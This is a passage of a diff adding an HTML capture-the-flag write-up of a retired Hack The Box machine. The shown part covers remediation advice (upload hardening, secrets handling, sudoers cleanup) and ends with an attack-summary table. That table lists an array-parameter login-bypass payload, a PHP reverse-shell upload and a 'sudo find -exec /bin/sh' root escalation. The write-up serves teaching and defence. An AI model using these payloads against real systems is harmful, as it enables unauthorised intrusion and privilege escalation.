+<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="x">    exit('Bad request');</span>
+<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="x">}</span>
+</code></pre></div></li>
+<li><strong>Compare strictly</strong>: <code>=== 0</code> (or avoid sentinel-style comparisons entirely). On PHP 8 the array-to-<code>strcmp</code> trick fails loudly (TypeError), but explicit validation is the real fix — don't rely on runtime version luck.</li>
+<li>Fail closed with <strong>generic error messages</strong> (the identical "Wrong Username or Password" here was fine; distinct messages for wrong-user vs wrong-pass would enable enumeration).</li>
+</ul>
+<h3 id="63-unrestricted-file-upload-rce">6.3 Unrestricted File Upload → RCE<a class="headerlink" href="#63-unrestricted-file-upload-rce" title="Permanent link">&para;</a></h3>
+<p>Layered controls, in order of importance:</p>
+<ol>
+<li><strong>Never store user uploads inside the web root</strong> (or at minimum, outside any PHP-enabled context). Serve them from a dedicated non-executable location.</li>
+<li><strong>Disable script execution in upload locations:</strong>
+   <div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="nt">&lt;Directory</span><span class="w"> </span><span class="s">/var/www/html/_uploaded</span><span class="nt">&gt;</span>
+<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="w">    </span><span class="nb">php_admin_flag</span><span class="w"> </span>engine<span class="w"> </span><span class="k">off</span>
+<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="w">    </span><span class="nt">&lt;FilesMatch</span><span class="w"> </span><span class="s">"\.(php|phtml|php[0-9]|pht|phar)$"</span><span class="nt">&gt;</span>
+<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="w">        </span><span class="nb">Require</span><span class="w"> </span><span class="k">all</span><span class="w"> </span>denied
+<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="w">    </span><span class="nt">&lt;/FilesMatch&gt;</span>
+<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="nt">&lt;/Directory&gt;</span>
+</code></pre></div></li>
+<li><strong>Whitelist extensions AND MIME types</strong> server-side (<code>finfo_file()</code>), and enforce a size cap.</li>
+<li><strong>Randomize filenames</strong> on disk (UUID) and keep the original name only in a database column — kills direct-guessing and path-traversal-in-filename attacks.</li>
+<li>Require <strong>authentication and authorization</strong> on the upload endpoint (this panel was "admin-only" protected <em>only</em> by the broken login).</li>
+</ol>
+<h3 id="64-credential-storage-reuse">6.4 Credential Storage &amp; Reuse<a class="headerlink" href="#64-credential-storage-reuse" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>config.php</code> held a <strong>plaintext password</strong> readable by the web-service account — a single LFI/source-disclosure bug away from leaking. Use environment variables or a secrets manager with read-scoped permissions; the app account should need no more.</li>
+<li><strong>Eliminate password reuse</strong> across accounts/services: <code>thisisagoodpassword</code> unlocked both the web admin and john's SSH. Enforce unique credentials per principal; deploy MFA on SSH where feasible.</li>
+<li>The <code>admin</code> web account and the <code>john</code> OS account must not share secrets — a web compromise should never translate into a shell.</li>
+</ul>
+<h3 id="65-dangerous-sudo-rule">6.5 Dangerous <code>sudo</code> Rule<a class="headerlink" href="#65-dangerous-sudo-rule" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Remove <code>find</code> from sudoers entirely.</strong> No interactive, <code>-exec</code>-capable, or interpreter-like binary (<code>find</code>, <code>vim</code>, <code>less</code>, <code>awk</code>, <code>tar</code>, <code>python</code>, <code>perl</code>, <code>cp</code>) should ever be granted blanket sudo.</li>
+<li>If a specific automated task genuinely needs elevated <code>find</code>, scope it to an exact, argument-locked invocation with a dedicated wrapper script (owned by root, non-writable), e.g. grant sudo on <code>/usr/local/sbin/cleanup-cachedir</code> — not on the binary itself.</li>
+<li>Audit with <code>sudo -l</code> per user and <code>visudo -c</code>; treat every grant as root-equivalent unless proven otherwise.</li>
+</ul>
+<h3 id="66-defense-in-depth">6.6 Defense-in-Depth<a class="headerlink" href="#66-defense-in-depth" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Keep the stack patched (Ubuntu 18.04 / kernel 4.15 / OpenSSH 7.6p1 are all EOL or near-EOL); upgrade PHP ≥ 8 where the type-juggling class of bugs fails closed.</li>
+<li>Log and alert on: repeated 302s from login with anomalous bodies, uploads of executable extensions, and any <code>sudo</code> usage by service-ineligible users.</li>
+</ul>
+<hr />
+<h2 id="7-lessons-learned-attack-summary">7. Lessons Learned (Attack Summary)<a class="headerlink" href="#7-lessons-learned-attack-summary" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Stage</th>
+<th>Technique</th>
+<th>Weakness</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Recon</td>
+<td>Nmap <code>-sVC -A -Pn</code></td>
+<td>—</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Enum</td>
+<td><code>ffuf</code> + directory listing</td>
+<td>Webroot exposes <code>login.php.swp</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Source review</td>
+<td><code>vim -r</code> swap recovery</td>
+<td>Editor artifacts served raw</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Auth bypass</td>
+<td><code>username[]=&amp;password[]=</code></td>
+<td><code>strcmp()</code> + <code>==</code> type juggling (PHP 7)</td>
+</tr>
+<tr>
+<td>5</td>
+<td>RCE</td>
+<td>PHP reverse shell upload</td>
+<td>No upload validation / no exec restriction</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Pivoting</td>
+<td><code>ffuf</code> → <code>/_uploaded/</code>, config.php creds, SSH reuse</td>
+<td>Plaintext secrets + password reuse</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Privesc</td>
+<td><code>sudo find . -exec /bin/sh \; -quit</code></td>
+<td>Interpreter in sudoers</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>← Previous</td>
+<td><em>Coming soon</em></td>
+</tr>
+<tr>
+<td>Back to index</td>
+<td><a href="../../../">All write-ups</a> · <a href="../../">HTB</a> · <a href="../">HTB — Easy</a></td>
+</tr>
+<tr>
+<td>Next →</td>
+<td><a href="../../../THM/Medium/Support/">THM — Support</a></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<p><strong>End of walkthrough.</strong></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+        
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../" class="md-footer__link md-footer__link--prev" aria-label="Previous: HTB — Easy">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                HTB — Easy
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../Medium/" class="md-footer__link md-footer__link--next" aria-label="Next: Medium">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Medium
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Daniel Dayan — educational use only. All write-ups cover retired Hack The Box machines and TryHackMe rooms. Nothing here may be used against systems without explicit written authorization.
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/xXDNDXx" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://www.linkedin.com/in/daniel-dayan-a66322352/" target="_blank" rel="noopener" title="LinkedIn" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://xxdndxx.github.io" target="_blank" rel="noopener" title="Portfolio" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M351.9 280H161c2.9 64.5 17.2 123.9 37.5 167.4 11.4 24.5 23.7 41.8 35.1 52.4 11.2 10.5 18.9 12.2 22.9 12.2s11.7-1.7 22.9-12.2c11.4-10.6 23.7-28 35.1-52.4 20.3-43.5 34.6-102.9 37.5-167.4zm-191-48h190.9c-2.8-64.5-17.1-123.9-37.4-167.4-11.4-24.4-23.7-41.8-35.1-52.4C268.1 1.7 260.4 0 256.4 0s-11.7 1.7-22.9 12.2c-11.4 10.6-23.7 28-35.1 52.4-20.3 43.5-34.6 102.9-37.5 167.4m-48 0c3.5-85.6 25.6-165.1 57.9-217.3C78.7 47.3 10.9 131.2 1.5 232zM1.5 280c9.4 100.8 77.2 184.7 169.3 217.3-32.3-52.2-54.4-131.7-57.9-217.3zm398.4 0c-3.5 85.6-25.6 165.1-57.9 217.3 92.1-32.7 159.9-116.5 169.3-217.3zm111.4-48C501.9 131.2 434.1 47.3 342 14.7c32.3 52.2 54.4 131.7 57.9 217.3z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.top", "navigation.footer", "toc.follow", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.tabs.link"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../../javascripts/app.js"></script>
+      
+    
+  </body>
+</html>
